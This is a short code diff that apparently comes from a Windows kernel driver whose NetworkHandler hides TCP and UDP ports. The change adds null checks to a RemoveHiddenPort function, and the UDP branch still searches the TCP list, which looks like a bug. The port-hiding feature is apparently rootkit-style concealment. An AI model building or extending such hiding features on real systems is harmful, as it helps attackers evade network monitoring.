@@ -144,11 +144,17 @@ bool NetworkHandler::RemoveHiddenPort(_In_ HiddenPort& port) {
 	switch (port.Type) {
 	case PortType::TCP: {
 		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
+
+		if (!entry)
+			return false;
 		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenTcpPorts, entry);
 	}
 
 	case PortType::UDP: {
 		HiddenPort* entry = FindListEntry<HiddenPorts, HiddenPort, HiddenPort&>(hiddenTcpPorts, port, finder);
+
+		if (!entry)
+			return false;
 		return RemoveListEntry<HiddenPorts, HiddenPort>(&hiddenUdpPorts, entry);
 	}
 	default:
